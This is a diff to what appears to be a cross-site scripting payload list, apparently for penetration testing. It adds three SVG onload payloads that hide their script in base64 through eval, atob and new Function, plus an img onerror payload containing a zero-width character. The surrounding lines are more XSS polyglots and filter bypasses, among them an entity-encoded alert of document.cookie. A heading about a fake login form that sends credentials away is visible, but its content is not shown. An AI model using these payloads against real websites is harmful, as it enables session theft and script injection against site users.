@@ -67,6 +67,9 @@ String.raw`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0
 <sVg////////onload=confirm(1)>
 <sVg    onload=confirm()><sVg>
 <sVg/onload=confirm()><sVg>
+<sVg/onload=eval(atob("Y29uZmlybSgp"))><sVg>
+<sVg/onload="eval(atob(atob(btoa(btoa(atob('Y29uZmlybSgp'))))));"><sVg>
+<sVg/onload='(new Function(atob("Y29uZmlybSgp")))();'><sVg>
 <sVg␌onload=confirm()><sVg>
 <sVg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
 <sVg onload="void 'javascript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=confirm()//&gt;\x3e';"></sVg>
@@ -78,6 +81,7 @@ var re=/jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//
 var str="jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=confirm()//>\x3e";
 <vIDeo controls onloadstart="confirm()"><source src=x></vIDeo>
 &#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
+"><img/src=x/onerro=6><img/src="1"/onerror​=alert(1);>
 ```
 
 ### Fake authentication form sending credentials to remote server
